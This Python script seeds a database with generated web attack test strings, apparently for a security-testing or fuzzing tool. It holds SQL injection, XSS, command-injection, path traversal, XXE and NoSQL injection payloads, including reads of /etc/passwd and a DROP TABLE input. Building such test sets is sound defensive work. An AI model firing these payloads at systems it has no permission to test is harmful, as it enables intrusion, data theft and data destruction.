from .database import engine, Base, SessionLocal, Payload

# Ensure tables exist
Base.metadata.create_all(bind=engine)

def seed():
    db = SessionLocal()
    
    # Clear existing payloads if any
    db.query(Payload).delete()
    db.commit()

    payloads = []

    # --- STRINGS (120 Payloads: 40 SQLi, 40 XSS, 40 Cmd Injection) ---
    
    # 40 SQLi
    sqli_bases = ["'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\", "\\\\", ";", "' or \"", "-- or # ", "' OR '1", "' OR 1 -- -", "\" OR \"\" = \"", "\" OR 1 = 1 -- -", "' OR '' = '"]
    for i in range(40):
        base = sqli_bases[i % len(sqli_bases)]
        suffix = f" AND SLEEP({i%5 + 1})--" if i % 2 == 0 else f" UNION SELECT {i}, NULL--"
        payloads.append(Payload(data_type="String", payload_text=f"{base}{suffix}", attack_vector="SQLi", risk_level="High"))

    # 40 XSS
    xss_bases = [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>",
        "javascript:alert(1)", "'-alert(1)-'", "\"-alert(1)-\"", "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>", "<input autofocus onfocus=alert(1)>",
        "<details/open/ontoggle=\"alert(1)\">"
    ]
    for i in range(40):
        base = xss_bases[i % len(xss_bases)]
        # Mix them up a bit
        text = base.replace("1", str(i)) if i % 3 == 0 else base
        payloads.append(Payload(data_type="String", payload_text=text, attack_vector="XSS", risk_level="Medium"))

    # 40 Command Injection
    cmd_bases = [
        "; id", "| id", "`id`", "$(id)", "&& id", "|| id",
        "; whoami", "| whoami", "`whoami`", "$(whoami)", "&& whoami", "|| whoami",
        "; dir", "| dir", "&& dir", "|| dir",
        "; ping -c 1 127.0.0.1", "| ping -n 1 127.0.0.1"
    ]
    for i in range(40):
        base = cmd_bases[i % len(cmd_bases)]
        text = base + f" # v{i}"
        payloads.append(Payload(data_type="String", payload_text=text, attack_vector="Command Injection", risk_level="Critical"))

    # --- FILE/PATHS (50 Payloads) ---
    path_bases = [
        "../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "/etc/passwd", "C:\\windows\\win.ini",
        "../../../../../../../../etc/passwd", "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd", "....\\\\....\\\\....\\\\windows\\\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252f..%252fetc%2fpasswd",
        "file:///etc/passwd", "http://127.0.0.1/admin"
    ]
    for i in range(50):
        base = path_bases[i % len(path_bases)]
        text = base
        if "passwd" in base and i % 2 == 0:
            text = base + "%00"
        payloads.append(Payload(data_type="Path", payload_text=text, attack_vector="LFI/RFI", risk_level="High"))

    # --- JSON/XML (50 Payloads) ---
    json_xml_bases = [
        '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}', '{"$where": "1==1"}',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
        '{"username": {"$in": ["admin"]}}', '{"role": "admin"}', '[1,2,3]', '{"isAdmin": true}'
    ]
    for i in range(50):
        base = json_xml_bases[i % len(json_xml_bases)]
        data_type = "JSON" if "{" in base or "[" in base else "XML"
        attack = "NoSQLi" if "$" in base else ("XXE" if "DOCTYPE" in base else "Logic Flaw")
        payloads.append(Payload(data_type=data_type, payload_text=base, attack_vector=attack, risk_level="High"))

    # --- INTEGERS (30 Payloads) ---
    int_bases = [
        "0", "-1", "2147483647", "-2147483648", "9223372036854775807", "1", "99999999",
        "1 OR 1=1", "1 AND 1=2", "1 UNION SELECT 1,2,3", "1; DROP TABLE users", "1' OR '1'='1"
    ]
    for i in range(30):
        base = int_bases[i % len(int_bases)]
        attack = "SQLi" if "OR" in base or "UNION" in base or "DROP" in base else ("Boundary" if "9" in base else "IDOR")
        payloads.append(Payload(data_type="Integer", payload_text=base, attack_vector=attack, risk_level="Medium"))

    # Bulk insert
    db.bulk_save_objects(payloads)
    db.commit()
    db.close()
    print(f"Successfully seeded {len(payloads)} payloads into the database!")

if __name__ == "__main__":
    seed()
